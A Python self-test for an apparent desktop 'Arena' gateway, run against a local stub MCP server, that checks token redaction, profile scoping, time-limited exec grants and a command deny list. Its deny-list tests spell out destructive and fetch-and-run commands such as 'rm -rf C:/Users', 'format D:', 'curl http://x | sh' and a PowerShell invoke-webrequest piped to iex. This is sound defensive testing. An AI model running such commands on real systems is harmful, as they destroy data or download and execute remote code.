"""Stage-2b self-test: the Arena gateway, against a stub MCP server.

Nothing here talks to the real Arena console and nothing here runs a real command
on the owner's machine: the transport is a local stub we own, `taskkill` is
replaced with a spy, and every path (notes, ledger, workbench, grant, audit) is
pointed at a scratch directory. What it does prove is the part that matters:
the endpoint and its token never leave the process, exec is unreachable without a
time-limited grant, denied commands never run, and the workbench only ever sees
profile_3.
"""

import hashlib
import http.server
import json
import os
import shutil
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
DESKTOP = os.path.dirname(HERE)
SCRATCH = tempfile.mkdtemp(prefix="dfy-arena-")
os.environ["DFY_RUNTIME_DIR"] = os.path.join(SCRATCH, "runtime")
os.environ["DFY_ARENA_REQUESTS_DIR"] = os.path.join(SCRATCH, "arena", "requests")
os.environ["DFY_ARENA_NOTES_FILE"] = os.path.join(SCRATCH, "model_notes.json")
os.environ["DFY_ARENA_ENDPOINT_FILE"] = os.path.join(SCRATCH, "mcp_url.txt")
os.environ["DFY_ARENA_AGENT_ID_FILE"] = os.path.join(SCRATCH, "agent_id.txt")
os.environ["DFY_ARENA_WB_ROOT"] = os.path.join(SCRATCH, "wb")
os.environ["DFY_ARENA_PROFILE_SCOPE"] = "profile_3"
os.environ["DFY_OUTBOX_ROOT"] = os.path.join(SCRATCH, "outbox")
os.environ.pop("DFY_ARENA_MCP_URL", None)
sys.path.insert(0, os.path.join(DESKTOP, "core"))

from dfy_core import app as app_mod  # noqa: E402
from dfy_core import arena, audit, config, security  # noqa: E402

PASS = FAIL = 0
SECRET = "TOPSECRET-0123456789abcdef"
STATE = {"fail": None, "payloads": []}


def check(name, cond, extra=""):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        print("FAIL %s %s" % (name, str(extra)[:220]))


def w(path, text):
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


# ------------------------------------------------------------------ stub server
class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _send(self, code, body=b"", ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        if code == 200:
            self.send_header("Mcp-Session-Id", "stub-session")
        self.end_headers()
        if body:
            try:
                self.wfile.write(body)
            except Exception:
                pass

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n).decode("utf-8", "replace")
        try:
            doc = json.loads(raw)
        except Exception:
            doc = {}
        STATE["payloads"].append(doc)
        m = doc.get("method")
        if STATE["fail"] == "http500":
            self._send(500, json.dumps({"error": "auth failed for %s" % SECRET}).encode())
            return
        if m == "initialize":
            self._send(200, json.dumps({"jsonrpc": "2.0", "id": doc.get("id"), "result": {
                "protocolVersion": "2024-11-05", "capabilities": {"tools": {}},
                "serverInfo": {"name": "stub", "version": "1"}}}).encode())
            return
        if m == "notifications/initialized":
            self._send(202)
            return
        if m == "tools/list":
            self._send(200, json.dumps({"jsonrpc": "2.0", "id": doc.get("id"), "result": {"tools": [
                {"name": "plan_create", "title": "建立任务清单"},
                {"name": "task_status", "title": "任务状态"}]}}).encode())
            return
        if m == "tools/call":
            if STATE["fail"] == "rpcerror":
                self._send(200, json.dumps({"jsonrpc": "2.0", "id": 3, "error": {
                    "code": -32000, "message": "no such tool"}}).encode())
                return
            if STATE["fail"] == "long":
                # 3 万字符正文：超过 MAX_REPLY（20000 字符的交付上限），
                # 但整个 HTTP 正文远小于 MAX_BODY，属于「能读到、按上限截断」那条路。
                self._send(200, json.dumps({"jsonrpc": "2.0", "id": doc.get("id"), "result": {
                    "content": [{"type": "text", "text": "x" * 30000}], "isError": False}}).encode())
                return
            if STATE["fail"] == "huge":
                # 1.1 MB 正文：越过 MAX_BODY（1 MB）读上限，必须被明确拒绝，
                # 而不是读半截再报「响应不是合法 JSON」。
                self._send(200, json.dumps({"jsonrpc": "2.0", "id": doc.get("id"), "result": {
                    "content": [{"type": "text", "text": "y" * 1100000}], "isError": False}}).encode())
                return
            text = json.dumps({"ok": True, "saved": 1,
                               "detail": "计划已保存，共 1 项任务（新增 1 项）。"})
            self._send(200, json.dumps({"jsonrpc": "2.0", "id": doc.get("id"), "result": {
                "content": [{"type": "text", "text": text}], "isError": False}}).encode())
            return
        self._send(200, json.dumps({"jsonrpc": "2.0", "id": doc.get("id"), "result": {}}).encode())


srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
port = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()

# ------------------------------------------------------------------- fixtures
URL = "http://127.0.0.1:%d/mcp?token=%s" % (port, SECRET)
w(os.environ["DFY_ARENA_ENDPOINT_FILE"], URL + "\n")
w(os.environ["DFY_ARENA_AGENT_ID_FILE"], "ag_test01")
w(os.environ["DFY_ARENA_NOTES_FILE"], json.dumps({"deepseek-flash": "用 flash，别自动升 Pro"}))
w(os.path.join(os.path.dirname(os.environ["DFY_ARENA_NOTES_FILE"]), "cmd_config_scratch.json"),
  json.dumps({"provider_sources": [{"id": "deepseek-flash", "provider": "deepseek", "model": "deepseek-v4.1-flash"},
                                   {"id": "other-src", "provider": "deepseek", "model": "deepseek-pro"}],
              "provider": {"default_source": "deepseek-flash"}}))
wb = os.environ["DFY_ARENA_WB_ROOT"]
os.makedirs(wb, exist_ok=True)
w(os.path.join(wb, "instances.json"), json.dumps({"instances": [
    {"name": "profile_1", "pid": 111, "qq_password": "hunter2", "cookie": "c=1"},
    {"name": "profile_2", "pid": 222},
    {"name": "profile_3", "pid": 999999, "running": True, "logged_in": True,
     "model_note": "flash", "qq_password": "hunter2", "cookie": "secret-cookie"}]}))

cfg = dict(config.load())
cfg["cmd_config"] = os.path.join(os.path.dirname(os.environ["DFY_ARENA_NOTES_FILE"]), "cmd_config_scratch.json")

print("--- endpoint validation ---")
check("loopback with port allowed", arena.validate_endpoint(URL)[0] is True, arena.validate_endpoint(URL))
check("loopback without port allowed", arena.validate_endpoint("http://127.0.0.1/mcp")[0] is True)
check("https allowed", arena.validate_endpoint("https://example.invalid/mcp")[0] is True)
check("plain remote host refused", arena.validate_endpoint("http://evil.example.com/mcp")[0] is False)
check("file share refused", arena.validate_endpoint("\\\\server\\share")[0] is False)
check("empty refused", arena.validate_endpoint("")[0] is False)

ov = arena.overview(cfg)
check("endpoint loaded from file", ov.get("configured") is True, ov)
check("upstream reachable", ov.get("reachable") is True, ov)
check("tools listed", ov.get("tools") == 2, ov)
check("fingerprint only, never the url", str(ov.get("endpoint_sha8")) != "None"
      and SECRET not in json.dumps(ov) and URL not in json.dumps(ov), ov)
check("session id learned by the client", arena._CLIENT.session == "stub-session", arena._CLIENT.session)
check("browser dispatch reported unavailable with a reason",
      ov.get("browser_available") is False and bool(ov.get("browser_reason")), ov)
check("scope is exactly profile_3", ov.get("profile_scope") == "profile_3", ov)
check("redact() now masks the live endpoint", SECRET not in security.redact(URL) and "TOPSECRET" not in security.redact(URL))

print("--- models / notes / routing ---")
mv = arena.models(cfg)
ids = [c["id"] for c in mv["items"]]
check("models from AstrBot config", "deepseek-flash" in ids, ids)
check("owner note attached", any(c["note"] and "flash" in c["note"] for c in mv["items"]), mv["items"][:2])
check("no credential fields leak through models", "hunter2" not in json.dumps(mv, ensure_ascii=False))
check("model card carries the note key the picker needs",
      any(c.get("note_key") == "deepseek-flash" for c in mv["items"]),
      [c.get("note_key") for c in mv["items"]])
check("note keys exposed for the picker", mv.get("note_keys") == ["deepseek-flash"], mv.get("note_keys"))
r = arena.route_preview(cfg, "deepseek-v4.1-flash")
check("routing by model name lands on its owner note",
      r.get("route", {}).get("target") == "deepseek-flash" and r["route"].get("via") == "astrbot source", r)
r = arena.route_preview(cfg, "other-src")
check("a model without an owner note is refused, not defaulted", "error" in r, r)
r = arena.route_preview(cfg, "")
check("empty model routes to default", r.get("route", {}).get("target", "").startswith("自动"), r)
r = arena.route_preview(cfg, "deepseek-flash")
check("note match is exact", r.get("route", {}).get("target") == "deepseek-flash", r)
r = arena.route_preview(cfg, "不存在的名字")
check("unknown model errors instead of guessing", "error" in r and "既不是备注" in r["error"], r)
w(os.environ["DFY_ARENA_NOTES_FILE"], json.dumps({"dup": "note a", "DUP": "note b"}))
arena._ENDPOINT["loaded"] = True
r = arena.route_preview(cfg, "dup")
check("ambiguous note errors", "error" in r and "多个" in r["error"], r)
res = arena.set_note(cfg, "dup", "  新备注  ")
check("note written", res.get("ok") is True, res)
disk = json.load(open(os.environ["DFY_ARENA_NOTES_FILE"], encoding="utf-8"))
check("note trimmed and stored", disk.get("dup") == "新备注", disk)
check("backup of notes taken", os.path.isfile(os.path.join(config.runtime_dir(), res["backup"])), res)
res = arena.set_note(cfg, "dup", "")
check("empty note removes the key", "dup" not in json.load(open(os.environ["DFY_ARENA_NOTES_FILE"], encoding="utf-8")), res)
w(os.environ["DFY_ARENA_NOTES_FILE"], "{ broken json")
res = arena.set_note(cfg, "x", "y")
check("corrupt notes file refused, not rewritten", "error" in res, res)
check("corrupt file left exactly as it was",
      open(os.environ["DFY_ARENA_NOTES_FILE"], encoding="utf-8").read() == "{ broken json")
w(os.environ["DFY_ARENA_NOTES_FILE"], json.dumps({"deepseek-flash": "用 flash，别自动升 Pro"}))

print("--- dispatch ---")
check("short task refused", "error" in arena.dispatch(cfg, "改一下"), arena.dispatch(cfg, "改一下"))
check("long task refused", "error" in arena.dispatch(cfg, "x" * 3000))
r = arena.dispatch(cfg, "浏览器派一个活试试看", mode="browser")
check("browser mode says unavailable", r.get("unavailable") is True, r)
n = len(STATE["payloads"])
res = arena.dispatch(cfg, "把桌面端的验收清单补齐", model="deepseek-flash", note="证据=文件路径")
check("dispatch ok", res.get("ok") is True, res)
plan = [p for p in STATE["payloads"][n:] if p.get("params", {}).get("name") == "plan_create"]
check("plan_create was the tool used", len(plan) == 1, [p.get("params", {}).get("name") for p in STATE["payloads"][n:]])
args = plan[0]["params"]["arguments"]
check("goal carries the task", args.get("goal") == "把桌面端的验收清单补齐", args)
check("one task with acceptance", len(args.get("tasks") or []) == 1
      and args["tasks"][0]["acceptance"] == "证据=文件路径", args)
check("reply surfaced as readable text", "计划已保存" in str(res.get("reply")), res)
check("reply is not raw escape soup", chr(92) + "u8ba1" not in str(res.get("reply")), res)
check("structured data kept for the UI", (res.get("data") or {}).get("saved") == 1, res)
check("ms recorded", isinstance(res.get("ms"), int), res)
led = os.path.join(os.environ["DFY_ARENA_REQUESTS_DIR"], res["file"])
check("ledger file written", os.path.isfile(led), led)
lr = json.load(open(led, encoding="utf-8"))
check("ledger state queued", lr.get("state") == "queued" and lr.get("model") == "deepseek-flash"
      and lr.get("agent_id") == "ag_test01", lr)
tsk = arena.tasks(cfg)
check("tasks lists the ledger", tsk["total"] >= 1 and tsk["counts"].get("queued", 0) >= 1, tsk["counts"])
det = arena.task_detail(cfg, res["file"])
check("task detail reads back", det.get("task") == "把桌面端的验收清单补齐", det)
check("task detail refuses traversal", "error" in arena.task_detail(cfg, "../mcp_url.txt"), arena.task_detail(cfg, "../mcp_url.txt"))
check("task detail refuses non-json name", "error" in arena.task_detail(cfg, "state.json"))

print("--- workbench ---")
wbst = arena.workbench_status(cfg)
check("only profile_3 is inspected", len(wbst["items"]) == 1 and wbst["items"][0]["name"] == "profile_3", wbst)
blob = json.dumps(wbst, ensure_ascii=False)
check("other profiles hidden", "profile_1" not in blob and "profile_2" not in blob, blob[:200])
check("secrets in the file are not projected", "hunter2" not in blob and "secret-cookie" not in blob, blob[:200])
check("model note carried through", wbst["items"][0].get("model_note") == "flash", wbst)
check("launcher missing reported", wbst.get("launcher") is False, wbst)
r = arena.workbench_action(cfg, "open", "profile_1")
check("other instances refused", "只允许" in str(r), r)
r = arena.workbench_action(cfg, "destroy", "profile_3")
check("unknown action refused", "error" in r, r)
r = arena.workbench_action(cfg, "close", "profile_3")
check("close needs confirmation first", r.get("confirm_required") is True, r)
r = arena.workbench_action(cfg, "open", "profile_3", "yes")
check("open without launcher refuses to guess", "找不到启动脚本" in str(r), r)
# spy first: a test must never fire a real taskkill at a pid we guessed at
calls = []
_real_run = arena.subprocess.run
def _spy(*a, **k):
    calls.append(a)
    return type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})()


arena.subprocess.run = _spy
try:
    r = arena.workbench_action(cfg, "close", "profile_3", "yes")
finally:
    arena.subprocess.run = _real_run
kill_calls = [c for c in calls if c and c[0] and str(c[0][0]).startswith("taskkill")]
check("close spy: taskkill on the recorded pid only", kill_calls
      and "999999" in kill_calls[0][0] and "/T" not in kill_calls[0][0], kill_calls)
# the spy also saw the pid probe (tasklist); what matters is that exactly one kill was issued
check("close spy: exactly one kill attempt", len(kill_calls) == 1, calls)
check("close reported ok", r.get("ok") is True, r)
w(os.path.join(wb, "instances.json"), json.dumps({"instances": [{"name": "profile_3", "pid": None}]}))
r = arena.workbench_action(cfg, "close", "profile_3", "yes")
check("close without a pid refuses to act", "没有可关闭的进程号" in str(r), r)

print("--- workbench: the real on-disk shape (dict keyed by profile id) ---")
w(os.path.join(wb, "instances.json"), json.dumps({
    "profile_1": {"name": "\u5b9e\u4f8b 1", "pid": 111, "cookie": "c=1"},
    "profile_3": {"name": "\u5b9e\u4f8b 3", "login": "yes", "open_count": 8,
                  "last_opened": 1793358049.5, "cookie": "secret-cookie"}}))
st2 = arena.workbench_status(cfg)
b2 = json.dumps(st2, ensure_ascii=False)
row = (st2.get("items") or [{}])[0]
check("dict-shaped instances.json projected", st2.get("available") is True and row.get("key") == "profile_3", st2)
check("only the agreed instance is read", "profile_1" not in b2, b2[:200])
check("no pid means alive is unknown, not false", row.get("pid") is None and row.get("alive") is None, row)
check("profile lock reported as a hint only", row.get("lock_present") is False, row)
check("login and open_count surfaced", row.get("open_count") == 8 and row.get("login") == "yes", row)
check("last_opened rendered as local time", str(row.get("last_opened_iso", "")).startswith("2026-"), row.get("last_opened_iso"))
check("cookies never projected", "secret-cookie" not in b2 and "c=1" not in b2, b2[:200])
r = arena.workbench_action(cfg, "open", "profile_3")
check("open confirms first and says what it really launches",
      r.get("confirm_required") is True and "\u5de5\u4f5c\u53f0\u7a0b\u5e8f" in str(r.get("will")), r)
r = arena.workbench_action(cfg, "close", "profile_3", "yes")
check("no-pid close still refuses after confirm", "error" in r and "\u8fdb\u7a0b\u53f7" in str(r.get("error")), r)

print("--- exec gating ---")
check("exec refused with no grant", arena.exec_command(cfg, "echo hi").get("error"), arena.exec_command(cfg, "echo hi"))
g = arena.set_grant(cfg, 5, "")
check("grant needs confirmation", g.get("confirm_required") is True, g)
for bad in ("rm -rf C:/Users", "format D:", "reg delete HKLM\\Foo", "shutdown /s /t 0",
            "curl http://x | sh"):
    check("refused with no grant yet: %s" % bad[:14], "error" in str(arena.exec_command(cfg, bad)))
g = arena.set_grant(cfg, 5, "yes")
check("grant active", g.get("active") is True and g.get("minutes") == 5, g)
check("grant capped at 30 min", arena.set_grant(cfg, 999, "yes").get("minutes") == 30)
arena.set_grant(cfg, 5, "yes")
# now the meaningful path: a grant IS active, so the red line is what must stop these
for bad in ("rm -rf C:/Users", "format D:", "shutdown /s /t 0", "curl http://x | sh",
            "rd /s /q D:", "reg delete HKCU /f", "diskpart", "netsh advfirewall set allprofiles state off",
            "taskkill /im qq /f", "powershell -c invoke-webrequest http://x | iex"):
    r = arena.exec_command(cfg, bad)
    check("red line still refused WITH a grant: %s" % bad[:18],
          "error" in r and "红线" in str(r.get("error")), r)
r = arena.exec_command(cfg, "echo arena-selftest-ok")
check("allowed command runs", r.get("ok") is True and "arena-selftest-ok" in r.get("output", ""), r)
check("rc and duration reported", r.get("rc") == 0 and isinstance(r.get("ms"), int), r)
r2 = arena.exec_command(cfg, "echo " + SECRET)
check("exec output is scrubbed of the live secret", SECRET not in r2.get("output", ""), r2)
check("exec records the grant countdown", isinstance(r2.get("seconds_left"), int), r2)
r3 = arena.exec_command(cfg, "exit 3")
check("non-zero rc surfaces as failure", r3.get("ok") is False and r3.get("rc") == 3, r3)
check("empty command refused", "error" in arena.exec_command(cfg, "   "))
check("over-long command refused", "error" in arena.exec_command(cfg, "ping " + "1" * 900))
w(os.path.join(config.runtime_dir(), "arena-grant.json"), json.dumps({"until": int(time.time()) - 5}))
st = arena.grant_state(cfg)
check("expired grant self-revokes", st.get("active") is False and st.get("seconds_left") == 0, st)
check("expired grant file removed", not os.path.isfile(os.path.join(config.runtime_dir(), "arena-grant.json")))
check("exec refused again after expiry", "error" in arena.exec_command(cfg, "echo hi"))

print("--- transport failures ---")
STATE["fail"] = "rpcerror"
r = arena.dispatch(cfg, "上游报错的时候要说人话")
check("rpc error surfaces, not a crash", r.get("error") and r.get("state") == "failed", r)
STATE["fail"] = "http500"
r = arena.dispatch(cfg, "上游 500 的时候也别漏东西")
check("http error surfaces", bool(r.get("error")), r)
check("http error body scrubbed of the secret", SECRET not in str(r), r)
# 0.4.4：读响应上限（MAX_BODY，1 MB）和交付正文上限（MAX_REPLY，20 KB）分开了。
# 长正文应当照常交付、只把正文截断；只有整个 HTTP 正文越过读上限才拒绝。
STATE["fail"] = "long"
c = arena.client(cfg)
ok, text = c.call("plan_create", {"goal": "截断", "tasks": []})
check("long reply truncated, not dropped",
      bool(ok) and text.endswith("…（已截断）") and len(text) == 20000 + len("…（已截断）"),
      (ok, len(text or "")))
r = arena.dispatch(cfg, "回复再长也要照常走完记账")
check("long reply still dispatches", r.get("ok") is True and r.get("state") == "queued", r)
STATE["fail"] = "huge"
r = arena.dispatch(cfg, "整个响应超过读上限的时候要拒绝")
check("body over the read cap refused",
      bool(r.get("error")) and "过大" in str(r.get("error")), r)
STATE["fail"] = None
check("recovers after the stub is healthy again", arena.dispatch(cfg, "恢复之后再派一次").get("ok") is True)

print("--- rooms: 每个实例读自己的 Arena 侧栏 ---")
os.environ["DFY_ARENA_TASKS_DIR"] = os.path.join(SCRATCH, "tasks")
os.makedirs(os.environ["DFY_ARENA_TASKS_DIR"], exist_ok=True)
from dfy_core import rooms  # noqa: E402
STUB_ROWS = [
    {"model_note": "qwen3.8-flash", "href": "/agent/aaa", "text": "qwen3.8-flash · 整理群聊"},
    {"model_note": "claude-haiku-5.5", "href": "/agent/bbb", "text": "claude-haiku-5.5 · 写日报"},
]


def _fake_launcher():  # 扮演 instance_launcher：只认 pending 的 inspect 任务，只读侧栏
    d = os.environ["DFY_ARENA_TASKS_DIR"]
    deadline = time.time() + 20
    while time.time() < deadline:
        for n in sorted(os.listdir(d)):
            if not n.endswith(".json"):
                continue
            p = os.path.join(d, n)
            doc, _ = rooms._read_json(p)
            if not isinstance(doc, dict) or doc.get("state") != "pending":
                continue
            if doc.get("kind") != "inspect_arena_notes":
                continue
            doc["state"] = "done"
            doc["summary"] = "stub covered 1 arena tab"
            doc["updated_at"] = "2026-10-31 18:00:00"
            doc["result"] = json.dumps({"pages": [{
                "title": "Arena", "page_url": "https://arena.ai/agent/cur",
                "sidebar_row_count": len(STUB_ROWS),
                "model_note_candidates": [{"model_note": r["model_note"],
                                           "model_tokens": [r["model_note"]],
                                           "href": r["href"], "row_text": r["text"],
                                           "row_index": i}
                                          for i, r in enumerate(STUB_ROWS)]}]}, ensure_ascii=False)
            rooms._write_json(p, doc)
        time.sleep(0.1)


threading.Thread(target=_fake_launcher, daemon=True).start()
ins = rooms.inspect(cfg, "profile_3", timeout=6)
check("inspect 从任务通道拿回房间", ins.get("ok") is True and len(ins.get("rows") or []) == 2, ins)
check("房间行带模型名与会话链接",
      (ins.get("rows") or [{}])[0].get("model_note") == "qwen3.8-flash"
      and (ins.get("rows") or [{}])[0].get("href") == "/agent/aaa", (ins.get("rows") or [])[:1])
snap = rooms.snapshot(cfg, refresh=True, profiles=["profile_3"], timeout=6)
check("snapshot 合并实例房间并缓存", len(snap.get("items") or []) == 2 and snap["items"][0]["profile"] == "profile_3", snap.get("profiles"))
check("侧栏相对链接补成完整地址",
      str((snap.get("items") or [{}])[0].get("url") or "").startswith("https://arena.ai/agent/"),
      (snap.get("items") or [{}])[0].get("url"))
mv2 = arena.models(cfg)
wb_cards = [c for c in (mv2.get("items") or []) if c.get("source") == "workbench"]
check("模型列表改成按实例读房间",
      mv2.get("source") == "workbench" and len(wb_cards) == 2, (mv2.get("source"), len(wb_cards)))
check("房间卡片带实例名与会话链接",
      bool(wb_cards) and wb_cards[0].get("profile") == "profile_3"
      and bool(wb_cards[0].get("provider")) and str(wb_cards[0].get("href") or "").startswith("/agent/"),
      (wb_cards or [{}])[0])
check("缓存过期/为空时 refresh 才会再去问实例",
      rooms.snapshot(cfg, refresh=False, profiles=["profile_3"], timeout=6).get("cached") is True, "cached flag")

print("--- leak sweep ---")
# Sweep only what the code wrote. The endpoint fixture obviously holds the secret —
# we seeded it there to feed the gateway, and it must stay byte-identical (never copied,
# never rewritten, never backed up).
fixture = os.environ["DFY_ARENA_ENDPOINT_FILE"]
fixture_bytes = open(fixture, "rb").read()
everything = []
for root, _dirs, files in os.walk(SCRATCH):
    for f in files:
        fp = os.path.join(root, f)
        if fp == fixture:
            continue
        if f.endswith((".json", ".jsonl", ".txt")):
            try:
                everything.append(open(fp, encoding="utf-8", errors="replace").read())
            except Exception:
                pass
blob = "\n".join(everything)
check("secret never written to disk", SECRET not in blob)
check("endpoint url never written to disk", URL not in blob)
check("audit rows carry no bearer token", "token=" not in blob)
check("endpoint fixture untouched by the gateway", open(fixture, "rb").read() == fixture_bytes)
_bd = os.path.join(config.runtime_dir(), "backups")
check("no backup or copy of the endpoint file exists",
      not (os.path.isdir(_bd) and [x for x in os.listdir(_bd) if "mcp_url" in x.lower()]))
check("the sweep really looked at code-written files",
      os.path.isdir(os.environ["DFY_ARENA_REQUESTS_DIR"]) and len(everything) >= 6, len(everything))
lines = [l for l in blob.splitlines() if '"arena_' in l or '"event":"arena' in l]
check("audit recorded arena calls at all", len(lines) >= 8, len(lines))
check("audit records tool+ok+ms shape", any("arena_exec" in l and "ms" in l for l in lines), lines[:2])
# 生产审计里出现 arena_* 是设计要求的（插件每次调用都要留痕），不能用它当泄漏信号。
# 真正要证明的是：本测试的审计没写到生产目录，而且本测试的私料没进生产审计。
probe = audit.write("arena_selftest_probe", ok=True)
rt_abs = os.path.abspath(config.runtime_dir())
check("this test's audit stays inside its own scratch runtime",
      bool(probe) and os.path.abspath(os.path.dirname(probe)) == rt_abs
      and rt_abs != os.path.abspath(os.path.join(DESKTOP, ".runtime")),
      os.path.basename(str(probe)))
prod = os.path.join(DESKTOP, ".runtime", "audit-%s.jsonl" % time.strftime("%Y%m%d"))
if os.path.isfile(prod):
    live = open(prod, encoding="utf-8", errors="replace").read()
    check("production audit carries none of this test's secrets",
          SECRET not in live and URL not in live and "arena_selftest_probe" not in live, prod)
    check("production audit has no test secret", SECRET not in live)
else:
    check("production audit file exists to compare", False, prod)

print("--- wiring ---")
check("arena routes are read+writable as declared", # pinned on purpose: adding a write route must be a conscious edit here too
    app_mod.WRITABLE == {
    "/v1/send", "/v1/control", "/v1/groups/enable", "/v1/groups/disable",
    "/v1/arena/dispatch", "/v1/arena/note", "/v1/arena/workbench", "/v1/arena/grant",
    "/v1/arena/exec",
    "/v1/backups", "/v1/backups/restore", "/v1/backups/export", "/v1/backups/import",
    "/v1/persona", "/v1/persona/restore", "/v1/models", "/v1/models/test",
    "/v1/settings", "/v1/credentials", "/v1/credentials/clear", "/v1/selftest",
    "/v1/setup/adopt", "/v1/setup/reset", "/v1/release/install", "/v1/release/rollback",
    "/v1/diag/bundle"}, app_mod.WRITABLE)
for p in ("/v1/arena/overview", "/v1/arena/tasks", "/v1/arena/task", "/v1/arena/models",
          "/v1/arena/rooms", "/v1/arena/instances",
          "/v1/arena/route", "/v1/arena/workbench", "/v1/arena/grant"):
    check("read route %s" % p, p in app_mod.ROUTES)
check("no route hands out the endpoint", not any("mcp-url" in p or "endpoint" in p for p in app_mod.ROUTES))

srv.shutdown()
shutil.rmtree(SCRATCH, ignore_errors=True)
print("ARENA SELFTEST (pass=%d fail=%d)" % (PASS, FAIL))
sys.exit(1 if FAIL else 0)
